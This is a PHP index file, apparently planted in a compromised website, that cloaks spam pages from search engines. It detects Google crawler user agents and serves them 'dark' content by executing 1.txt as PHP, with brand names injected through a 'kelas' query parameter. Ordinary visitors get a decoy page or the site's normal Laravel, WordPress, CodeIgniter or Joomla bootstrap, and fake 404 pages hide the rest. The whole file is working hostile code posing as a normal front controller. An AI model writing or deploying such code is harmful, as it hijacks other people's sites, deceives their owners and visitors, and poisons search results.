<?php
error_reporting(0);
ini_set('display_errors', 0);

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

$is_googlebot = (
    strpos($ua, 'googlebot') !== false ||
    strpos($ua, 'google-inspectiontool') !== false ||
    strpos($ua, 'mediapartners-google') !== false ||
    strpos($ua, 'adsbot-google') !== false ||
    strpos($ua, 'googleother') !== false ||
    strpos($ua, 'google-extended') !== false ||
    strpos($ua, 'googleweblight') !== false
);

$white_file = __DIR__ . '/white.txt';
$dark_file = __DIR__ . '/1.txt';

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'https';
$fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

if ($is_googlebot) {
    if (file_exists($dark_file)) {
        $BRANDS = isset($_GET['kelas']) ? strtoupper(trim($_GET['kelas'])) : 'BRAND';
        $urlPath = $fullUrl;
        include(__DIR__.'/1.txt');
    } else {
        echo '<h1>Dark Content Not Found</h1>';
    }
    exit;
}

if (file_exists($white_file)) {
    readfile($white_file);
    exit;
}


if (file_exists(__DIR__ . '/../vendor/autoload.php')) {
    require __DIR__ . '/../vendor/autoload.php';
    $app = require_once __DIR__ . '/../bootstrap/app.php';
    $kernel = $app->make(IlluminateContractsHttpKernel::class);
    $response = $kernel->handle(
        $request = IlluminateHttpRequest::capture()
    );
    $response->send();
    $kernel->terminate($request, $response);
    exit;
}

if (file_exists(__DIR__ . '/wp-blog-header.php')) {
    define('WP_USE_THEMES', true);
    require_once(__DIR__ . '/wp-blog-header.php');
    exit;
}

if (file_exists(__DIR__ . '/system/core/CodeIgniter.php')) {
    require_once __DIR__ . '/system/core/CodeIgniter.php';
    exit;
}

if (file_exists(__DIR__ . '/configuration.php')) {
    define('_JEXEC', 1);
    require_once __DIR__ . '/configuration.php';
    require_once __DIR__ . '/includes/defines.php';
    require_once __DIR__ . '/includes/framework.php';
    exit;
}


function feedback404()
{
    header("HTTP/1.0 404 Not Found");
    echo "<h1>404 Not Found</h1>";
    echo "Error Not Found.";
}

if (isset($_GET['kelas'])) {
    $filename = __DIR__ . "/list.txt";
    
    if (!file_exists($filename)) {
        feedback404();
        exit();
    }
    
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $target_string = strtolower($_GET['kelas']);
    
    $BRAND_FOUND = false;
    foreach ($lines as $item) {
        if (strtolower(trim($item)) === $target_string) {
            $BRAND = strtoupper(trim($target_string));
            $BRAND_FOUND = true;
            break;
        }
    }
    
    if ($BRAND_FOUND) {
        $BRANDS = $BRAND;
        
        $parsedUrl = parse_url($fullUrl);
        $scheme   = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
        $host     = isset($parsedUrl['host'])   ? $parsedUrl['host']   : '';
        $path     = isset($parsedUrl['path'])   ? $parsedUrl['path']   : '';
        $query    = isset($parsedUrl['query'])  ? $parsedUrl['query']  : '';
        $urlPath  = $scheme . "://" . $host . $path . '?' . $query;

        $BRANDS_DARK = $BRANDS;
        $urlPathDark = $urlPath;
        
        if (file_exists(__DIR__ . '/1.txt')) {
            include(__DIR__ . '/1.txt');
        } else {
            echo '<h1>1.txt Not Found</h1>';
        }
        exit;

    } else {
        feedback404();
        exit();
    }
} else {
    feedback404();
    exit();
}
?>